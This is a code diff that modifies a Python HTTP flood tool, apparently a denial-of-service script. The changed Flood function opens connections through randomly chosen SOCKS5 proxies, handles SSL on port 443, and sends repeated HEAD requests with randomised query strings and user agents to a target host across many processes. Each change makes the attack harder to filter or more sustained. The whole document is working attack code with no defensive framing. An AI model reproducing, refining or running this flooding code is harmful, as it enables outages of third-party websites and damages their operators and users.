@@ -101,32 +101,28 @@ def checkProxies():
 time.sleep(1)
 
 def Flood(indexPicker):
-    if indexPicker < len(proxies):
-        proxy = rC(proxies).strip().split(":")
-    else:
-        proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
+    Accept = rC(AcceptHeaders)
+    User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
     while True:
         try:
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+            proxy = rC(proxies).strip().split(":")
             s = socks.socksocket()
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            s.settimeout(5)
             s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             for _ in range(100):
                 valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
-                Accept = rC(AcceptHeaders)
-                User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
-                floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
+                floodHeader = "HEAD {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
                 floodHeader = floodHeader.encode()
                 s.send(floodHeader)
             s.close()
             print("Flood sent " + proxy[0] + ":" + proxy[1])
-        except socket.error:
-            time.sleep(.1)
         except:
-            pass
+            time.sleep(0.01)
 
 if "--socksCrawler" in sys.argv:
     socksCrawler()
@@ -149,7 +145,8 @@ for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
 for indexPicker in range(threadNumber):
-    thread = multiprocessing.Process(target=Flood, args=(indexPicker, ), daemon=True)
-    thread.start()
-while True:
-    input()
+    process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
+    process.setDaemon = False
+    process.start()
+
+
